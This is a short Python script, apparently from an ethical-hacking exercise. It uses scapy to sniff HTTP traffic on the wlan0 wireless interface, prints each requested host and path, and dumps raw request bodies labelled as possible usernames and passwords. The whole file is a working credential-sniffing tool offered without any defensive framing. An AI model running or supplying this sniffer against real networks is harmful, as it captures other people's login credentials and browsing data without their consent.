#! /usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def process_sniff_packet(packet):

    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] HTTPRequest >> " + url)
        if packet.haslayer(scapy.Raw):
            print("\n")
            print("[+] Possible username & password is >> {}".format(packet[scapy.Raw].load))
            print("\n")



def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)

sniff("wlan0")
